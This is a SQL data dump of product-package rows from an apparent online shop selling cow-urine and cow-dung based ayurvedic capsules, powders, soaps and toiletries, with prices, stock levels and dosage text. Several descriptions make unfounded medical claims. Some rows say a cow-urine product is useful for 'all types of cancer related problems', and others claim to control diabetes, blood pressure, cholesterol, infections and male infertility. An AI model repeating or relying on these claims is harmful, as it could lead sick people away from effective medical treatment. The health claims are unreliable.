(124, 228, 'GOG102', 123, 120, 21, 'de', 'de', '', '85', 7, '85', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(125, 229, 'GGA-GA-G-001', 200, 200, 10, '<p>Helps in increasing oxygen level in body, Increases immunity.<br />\r\n&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra ghan, Bhasma Powder,&nbsp;</p>\r\n', '', '', '', 1, '88', 0, 0, '', '', '', '', 0, '2022-02-15 15:54:20', '2022-03-30 06:26:43', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(126, 229, 'GGA-GA-S-001', 150, 150, 10, '<p>Helps in increasing oxygen level in body, Increases immunity.</p>\r\n\r\n<p><br />\r\n<strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Bhasma Powder,&nbsp;</p>\r\n', '', '', '', 2, '88', 0, 0, '', '', '', '', 0, '2022-02-15 15:54:20', '2022-03-30 06:26:43', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(127, 229, 'GGA-GA-N-001', 120, 120, 10, '<p>Helps in increasing oxygen level in body, Increases immunity.<br />\r\n&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Bhasma Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '88', 0, 0, '', '', '', '', 0, '2022-02-15 15:54:20', '2022-03-30 06:26:43', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(128, 230, 'GGA-GA-G-002', 250, 250, 10, '<p>Helps with urinary tract infection, kidney problems, prostate problems, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Punarnava Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:03:19', '2022-03-30 06:24:41', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(129, 230, 'GGA-GA-S-002', 200, 200, 10, '<p>Helps with urinary tract infection, kidney problems, prostate problems, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra ghan, Punarnava Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:03:19', '2022-03-30 06:24:41', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', '');
INSERT INTO `productpackage` (`id`, `pid`, `pcode`, `mrp`, `sellingprice`, `stock`, `overview`, `mdesc`, `sname`, `svalue`, `package_id`, `psize`, `home_page`, `bundle_products`, `thumbimg`, `simg`, `mimg`, `limg`, `status`, `created_date`, `modified_date`, `how_to_use`, `youtube`, `youtubelink`) VALUES
(130, 230, 'GGA-GA-N-002', 150, 150, 10, '<p>Helps with urinary tract infection, kidney problems, prostate problems, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra ghan, Punarnava Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:03:19', '2022-03-30 06:24:41', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(131, 231, 'GGA-GA-G-003', 300, 300, 10, '<p>Helps in increasing fertility in men.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nNandimutra Ghan, Drumstick Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '88', 0, 0, '', '', '', '', 0, '2022-02-15 16:08:13', '2022-03-30 06:24:07', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(132, 231, 'GGA-GA-S-003', 250, 250, 10, '<p>Helps in increasing fertility in men.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nNandimutra Ghan, Drumstick Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '88', 0, 0, '', '', '', '', 0, '2022-02-15 16:08:13', '2022-03-30 06:24:07', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(133, 231, 'GGA-GA-N-003', 200, 200, 10, '<p>Helps in increasing fertility in men.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nNandimutra Ghan, Drumstick Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '88', 0, 0, '', '', '', '', 0, '2022-02-15 16:08:13', '2022-03-30 06:24:07', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(134, 232, 'GGA-GA-G-004', 150, 150, 10, '<p>Helps in cough, cold, sore throat, viral infection, fever, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Tulasi Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:13:00', '2022-03-30 06:23:21', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(135, 232, 'GGA-GA-S-004', 150, 140, 10, '<p>Helps in cough, cold, sore throat, viral infection, fever, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Tulasi Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:13:00', '2022-03-30 06:23:21', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(136, 232, 'GGA-GA-N-004', 140, 140, 10, '<p>Helps in cough, cold, sore throat, viral infection, fever, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Tulasi Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:13:00', '2022-03-30 06:23:21', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(137, 233, 'GGA-GA-G-005', 250, 250, 10, '<p>Helps in balancing cholesterol, controlling blood pressure. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Arjun Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:17:12', '2022-03-30 06:22:39', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(138, 233, 'GGA-GA-S-005', 250, 200, 10, '<p>Helps in balancing cholesterol, controlling blood pressure. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Arjun Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:17:12', '2022-03-30 06:22:39', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(139, 233, 'GGA-GA-N-005', 150, 150, 10, '<p>Helps in balancing cholesterol, controlling blood pressure. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Arjun Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:17:12', '2022-03-30 06:22:39', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(140, 234, 'GGA-GA-G-006', 200, 185, 10, '<p>Helps in digestion, reduces constipation. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Triphala Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:23:35', '2022-03-30 06:22:07', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(141, 234, 'GGA-GA-S-006', 150, 150, 10, '<p>Helps in digestion, reduces constipation. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Triphala Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:23:35', '2022-03-30 06:22:07', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(142, 234, 'GGA-GA-N-006', 150, 100, 10, '<p>Helps in digestion, reduces constipation. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Triphala Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:23:35', '2022-03-30 06:22:07', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(143, 235, 'GGA-GA-G-007', 300, 300, 10, '<p>Helps in digestion, reduces constipation. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Triphala Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '106', 1, 1, '', '', '', '', 0, '2022-02-15 16:28:56', '2022-03-30 08:45:46', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(144, 235, 'GGA-GA-S-007', 300, 250, 10, '<p>Helps in digestion, reduces constipation. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Triphala Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:28:56', '2022-03-30 08:45:46', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(145, 235, 'GGA-GA-N-007', 300, 200, 10, '<p>Helps in digestion, reduces constipation. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Triphala Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:28:56', '2022-03-30 08:45:46', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(146, 236, 'GGA-GA-G-008', 200, 180, 10, '<p>Helps in diabetes control, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra ghan, Saptharangi Powder</p>\r\n\r\n<p><br />\r\n&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '106', 1, 0, '', '', '', '', 0, '2022-02-15 16:32:38', '2022-03-30 06:21:06', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(147, 236, 'GGA-GA-S-008', 200, 160, 10, '<p>Helps in diabetes control, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra ghan, Saptharangi Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:32:38', '2022-03-30 06:21:06', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(148, 236, 'GGA-GA-N-008', 200, 120, 10, '<p>Helps in diabetes control, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra ghan, Saptharangi Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:32:38', '2022-03-30 06:21:06', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(149, 237, 'GGA-GA-G-009', 150, 150, 10, 'Gogarbha is prepared with purified cow urine and useful for all types of cancer related problems', 'All Types Of Cancer Related Problems', '', '', 1, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:37:11', '2022-02-15 18:01:56', '', '', ''),
(150, 237, 'GGA-GA-S-009', 150, 150, 10, 'Gogarbha is prepared with purified cow urine and useful for all types of cancer related problems', 'All Types Of Cancer Related Problems', '', '', 2, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:37:11', '2022-02-15 18:01:56', '', '', ''),
(151, 237, 'GGA-GA-N-009', 150, 150, 10, 'Gogarbha is prepared with purified cow urine and useful for all types of cancer related problems', 'All Types Of Cancer Related Problems', '', '', 3, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:37:11', '2022-02-15 18:01:56', '', '', ''),
(152, 238, 'GGA-GA-G-010', 150, 150, 10, 'Gogarbha is prepared with purified cow urine and useful for All kinds of pain relief and immune development', 'All Kinds Of Pain Relief And Immune Development', '', '', 1, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:43:09', '2022-02-15 18:01:44', '', '', ''),
(153, 238, 'GGA-GA-S-010', 150, 150, 10, 'Gogarbha is prepared with purified cow urine and useful for All kinds of pain relief and immune development', 'All Kinds Of Pain Relief And Immune Development', '', '', 2, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:43:10', '2022-02-15 18:01:44', '', '', ''),
(154, 238, 'GGA-GA-N-010', 150, 150, 10, 'Gogarbha is prepared with purified cow urine and useful for All kinds of pain relief and immune development', 'All Kinds Of Pain Relief &amp; Immune Development', '', '', 3, '106', 0, 0, '', '', '', '', 0, '2022-02-15 16:43:10', '2022-02-15 18:01:44', '', '', ''),
(155, 239, 'GGA-CA-G-001', 450, 430, 10, '<p>Helps in the restoration of lost micronutrients in water. It also helps in boosting Prana Shakti (Vital Air) in the human body.&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nBhasama-Made of Desi cow dung cake burnt completely with desi ghee.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '107', 1, 0, '', '', '', '', 0, '2022-02-15 16:55:33', '2022-03-30 08:42:20', '<p>Dosage: Take one tea-spoon of powder along with a glass of warm water twice a day, or as directed by the Ayurvedic doctor.</p>\r\n', '', ''),
(156, 239, 'GGA-CA-S-001', 450, 420, 10, '<p>Helps in the restoration of lost micronutrients in water. It also helps in boosting Prana Shakti (Vital Air) in the human body.&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nBhasama-Made of Desi cow dung cake burnt completely with desi ghee.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '107', 0, 0, '', '', '', '', 0, '2022-02-15 16:55:33', '2022-03-30 08:42:20', '<p>Dosage: Take one tea-spoon of powder along with a glass of warm water twice a day, or as directed by the Ayurvedic doctor.</p>\r\n', '', ''),
(157, 239, 'GGA-CA-N-001', 420, 400, 10, '<p>Helps in the restoration of lost micronutrients in water. It also helps in boosting Prana Shakti (Vital Air) in the human body.&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nBhasama-Made of Desi cow dung cake burnt completely with desi ghee.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '107', 0, 0, '', '', '', '', 0, '2022-02-15 16:55:33', '2022-03-30 08:42:20', '<p>Dosage: Take one tea-spoon of powder along with a glass of warm water twice a day, or as directed by the Ayurvedic doctor.</p>\r\n', '', ''),
(158, 240, 'GGA-CA-G-002', 350, 300, 10, '<p>Helpful in all stomach-related problems such as Bile, indigestion, Acidity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Anise, Cumin, Celery, Black Salt, Sindhav Salt<br />\r\n&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '107', 1, 1, '', '', '', '', 0, '2022-02-15 17:01:25', '2022-03-30 06:15:02', '<p>Dosage: Take one tea-spoon of powder along with a glass of warm water, or as may be directed by the Ayurvedic doctor.</p>\r\n', '', ''),
(159, 240, 'GGA-CA-S-002', 320, 290, 10, '<p>Helpful in all stomach-related problems such as Bile, indigestion, Acidity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Anise, Cumin, Celery, Black Salt, Sindhav Salt<br />\r\n&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '107', 0, 0, '', '', '', '', 0, '2022-02-15 17:01:25', '2022-03-30 06:15:02', '<p>Dosage: Take one tea-spoon of powder along with a glass of warm water, or as may be directed by the Ayurvedic doctor.</p>\r\n', '', ''),
(160, 240, 'GGA-CA-N-002', 300, 250, 10, '<p>Helpful in all stomach related problems such as Bile, indigestion, Acidity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Anise, Cumin, Celery, Black Salt, Sindhav Salt<br />\r\n&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '107', 0, 0, '', '', '', '', 0, '2022-02-15 17:01:25', '2022-03-30 06:15:02', '<p>Dosage: Take one tea-spoon of powder along with a glass of warm water, or as may be directed by the Ayurvedic doctor.</p>\r\n', '', ''),
(161, 241, 'GGA-CA-G-003', 230, 230, 10, '<p>Helpful in all stomach-related problems such as indigestion, acidity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Amla, Baheda, Harde, Cow Urine<br />\r\n&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '107', 1, 0, '', '', '', '', 0, '2022-02-15 17:05:42', '2022-03-30 07:14:34', '<p>Dosage: Take one tea-spoon of powder along with a glass of warm water, or as directed by the Ayurvedic Doctor.</p>\r\n', '', ''),
(162, 241, 'GGA-CA-S-003', 220, 220, 10, '<p>Helpful in all stomach related problems such as indigestion, acidity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Amla , Baheda, Harde, Cow Urine<br />\r\n&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '107', 0, 0, '', '', '', '', 0, '2022-02-15 17:05:42', '2022-03-30 07:14:34', '<p>Dosage: Take one tea-spoon of powder along with a glass of warm water, or as directed by the Ayurvedic Doctor.</p>\r\n', '', ''),
(163, 241, 'GGA-CA-N-003', 190, 180, 10, '<p>Helpful in all stomach related problems such as indigestion, acidity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Amla , Baheda, Harde, Cow Urine<br />\r\n&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '107', 0, 0, '', '', '', '', 0, '2022-02-15 17:05:42', '2022-03-30 07:14:34', '<p>Dosage: Take one tea-spoon of powder along with a glass of warm water, or as directed by the Ayurvedic Doctor.</p>\r\n', '', ''),
(164, 242, 'GGA-CA-G-004', 200, 200, 10, '<p>Helps to control Blood sugar and related problems arise there from. Maintains healthy blood sugar level that is already within normal limits.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nSaptarangi Powder, Gudmaar Powder,Tejpatta Powder, Chiraita Powder, Methi Powder, Jambul Seed Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '108', 1, 0, '', '', '', '', 0, '2022-02-15 17:10:24', '2022-03-30 06:12:10', '<p>Dosage: Take one tea-spoon of powder along with a glass of warm water twice a day, or as directed by the Ayurvedic doctor.</p>\r\n', '', ''),
(165, 242, 'GGA-CA-S-004', 200, 180, 10, '<p>Helps to control blood sugar and related problems arise there from. Maintains healthy blood sugar level that is already within normal limits.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nSaptarangi Powder, Gudmaar Powder,Tejpatta Powder, Chiraita Powder, Methi Powder, Jambul Seed Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '108', 0, 0, '', '', '', '', 0, '2022-02-15 17:10:24', '2022-03-30 06:12:10', '<p>Dosage: Take one tea-spoon of powder along with a glass of warm water twice a day, or as directed by the Ayurvedic doctor.</p>\r\n', '', ''),
(166, 242, 'GGA-CA-N-004', 200, 160, 10, '<p>Helps to control blood sugar and related problems arise there from. Maintains healthy blood sugar level that is already within normal limits.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nSaptarangi Powder, Gudmaar Powder,Tejpatta Powder, Chiraita Powder, Methi Powder, Jambul Seed Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '108', 1, 0, '', '', '', '', 0, '2022-02-15 17:10:24', '2022-03-30 06:12:10', '<p>Dosage: Take one tea-spoon of powder along with a glass of warm water twice a day, or as directed by the Ayurvedic doctor.</p>\r\n', '', ''),
(167, 243, 'GGA-SA-G-001', 250, 250, 10, '<p>Useful for acne, bruises, skin infections.</p>\r\n\r\n<p><strong>Ingredients: </strong></p>\r\n\r\n<p>Desi cow gaumutra, gomay rus, panchagavya ghrita, turmeric, desi cow buttermilk, neem, coconut oil.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '107', 1, 0, '', '', '', '', 0, '2022-02-15 17:20:35', '2022-03-30 12:02:59', '<p>Dosage: Apply on the affected area and leave for one hour or as directed by gavya siddh.</p>\r\n', '', ''),
(168, 243, 'GGA-SA-S-001', 200, 200, 10, '<p>Useful for acne, bruises, skin infections.</p>\r\n\r\n<p><strong>Ingredients: </strong></p>\r\n\r\n<p>Desi cow gaumutra, gomay rus, panchagavya ghrita, turmeric, desi cow buttermilk, neem, coconut oil.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '107', 0, 0, '', '', '', '', 0, '2022-02-15 17:20:35', '2022-03-30 12:02:59', '<p>Dosage: Apply on the affected area and leave for one hour or as directed by gavya siddh.</p>\r\n', '', ''),
(169, 243, 'GGA-SA-N-001', 150, 150, 10, '<p>Useful for acne, bruises, skin infections.</p>\r\n\r\n<p><strong>Ingredients: </strong></p>\r\n\r\n<p>Desi cow gaumutra, gomay rus, panchagavya ghrita, turmeric, desi cow buttermilk, neem, coconut oil.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '107', 0, 0, '', '', '', '', 0, '2022-02-15 17:20:35', '2022-03-30 12:02:59', '<p>Dosage: Apply on the affected area and leave for one hour or as directed by gavya siddh.</p>\r\n', '', ''),
(170, 244, 'GGA-SA-G-002', 200, 200, 10, '<p>Heals disease to feel relief helps in stopping premature hair loss, formation of white hair &amp; removing dandruff. Makes hair stronger&amp; shiny. Ensures peaceful sleep.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine Shaar, Aritha, Shikakai, Nagarmotha, Amla.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '109', 0, 0, '', '', '', '', 0, '2022-02-15 17:27:47', '2022-03-30 07:37:19', '<p>Dosage: Apply to your scalp and massage until it lathers and washes or As directed by Gavya Siddh.</p>\r\n', '', ''),
(171, 244, 'GGA-SA-S-002', 150, 150, 10, '<p>Heals disease to feel relief helps in stopping premature hair loss, formation of white hair &amp; removing dandruff. Makes hair stronger&amp; shiny. Ensures peaceful sleep.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine Shaar, Aritha, Shikakai, Nagarmotha, Amla.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '109', 0, 0, '', '', '', '', 0, '2022-02-15 17:27:47', '2022-03-30 07:37:19', '<p>Dosage: Apply to your scalp and massage until it lathers and washes or As directed by Gavya Siddh.</p>\r\n', '', ''),
(172, 244, 'GGA-SA-N-002', 120, 100, 10, '<p>Heals disease to feel relief helps in stopping premature hair loss, formation of white hair &amp; removing dandruff. Makes hair stronger&amp; shiny. Ensures peaceful sleep.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine Shaar, Aritha, Shikakai, Nagarmotha, Amla.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '109', 0, 0, '', '', '', '', 0, '2022-02-15 17:27:47', '2022-03-30 07:37:19', '<p>Dosage: Apply to your scalp and massage until it lathers and washes or As directed by Gavya Siddh.</p>\r\n', '', ''),
(173, 245, 'GOG89', 300, 250, 10, 'dmeo', 'dmeo', 'dmeo', '87', 7, '87', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(174, 246, 'GGA-SA-G-003', 500, 450, 10, '<p>Natural oxygen for skin, for general use &amp; for all types of skin-related problems. Protects your skin from roughness, dryness, keeps your skin refreshed, and prevents your skin from damage. 100% lather and chemical-free Panchagavya Cow Dung Soap specially made for absolute skin protection.&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Gomuthra, Cowdung Essence, Neem Oil, Coconut Oil, Multani Matti, Ochre, Turmeric, Camphor, Tulsi, Alovera, Rita, Shegekai, Silicate 0.01%.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '76', 1, 0, '', '', '', '', 0, '2022-02-16 09:19:09', '2022-03-30 11:53:52', '', '', ''),
(175, 246, 'GGA-SA-S-003', 450, 450, 10, '<p>Natural Oxygen for skin, for general use &amp; for all types of skin-related problems. Protects your skin from roughness, dryness, keeps your skin refreshed, and prevents your skin from damage. 100% lather and chemical-free Panchagavya Cow Dung Soap specially made for absolute skin protection.&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Gomuthra, Cowdung Essence, Neem Oil, Coconut Oil, Multani Matti, Ochre, Turmeric, Camphor, Tulsi, Alovera, Rita, Shegekai, Silicate 0.01%.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '76', 0, 0, '', '', '', '', 0, '2022-02-16 09:19:09', '2022-03-30 11:53:52', '', '', ''),
(176, 246, 'GGA-SA-N-003', 450, 420, 10, '<p>Natural oxygen for skin, for general use &amp; for all types of skin-related problems. Protects your skin from roughness, dryness, keeps your skin refreshed, and prevents your skin from damage. 100% lather and chemical-free Panchagavya Cow Dung Soap specially made for absolute skin protection.&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Gomuthra, Cowdung Essence, Neem Oil, Coconut Oil, Multani Matti, Ochre, Turmeric, Camphor, Tulsi, Alovera, Rita, Shegekai, Silicate 0.01%.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '76', 0, 0, '', '', '', '', 0, '2022-02-16 09:19:09', '2022-03-30 11:53:52', '', '', ''),
(177, 247, 'new123', 300, 250, 10, 'demo', 'dmeo', 'dmeo', '', 7, '', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(178, 248, 'GGA-SA-G-004', 950, 900, 10, '<p>Gou danth tooth powder prevents common dental problems which effects gums, teeth and resist bad breath fights with gems and bacteria which affect your tooth. It strengthens your teeth and will give you a healthy dental life.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Gomaya Bhasmam, Clove Nutmug, Amruthadhara coriander, Tulasi, pepperment Himalayan Rock Salt, Panchagavyam, Black Pepper.</p>\r\n', '', '', '', 1, '106', 1, 0, '', '', '', '', 0, '2022-02-16 09:25:22', '2022-03-30 11:49:22', '', '', ''),
(179, 248, 'GGA-SA-S-004', 900, 890, 10, '<p>Gou danth tooth powder prevents common dental problems which effects gums, teeth and resist bad breath fights with gems and bacteria which affect your tooth. It strengthens your teeth and will give you a healthy dental life.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Gomaya Bhasmam, Clove Nutmug, Amruthadhara coriander, Tulasi, pepperment Himalayan Rock Salt, Panchagavyam, Black Pepper.</p>\r\n', '', '', '', 2, '106', 0, 0, '', '', '', '', 0, '2022-02-16 09:25:22', '2022-03-30 11:49:22', '', '', ''),
(180, 248, 'GGA-SA-N-004', 890, 850, 10, '<p>Gou danth tooth powder prevents common dental problems which effects gums, teeth and resist bad breath fights with gems and bacteria which affect your tooth. It strengthens your teeth and will give you a healthy dental life.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Gomaya Bhasmam, Clove Nutmug, Amruthadhara coriander, Tulasi, pepperment Himalayan Rock Salt, Panchagavyam, Black Pepper.</p>\r\n', '', '', '', 3, '106', 0, 0, '', '', '', '', 0, '2022-02-16 09:25:22', '2022-03-30 11:49:22', '', '', ''),
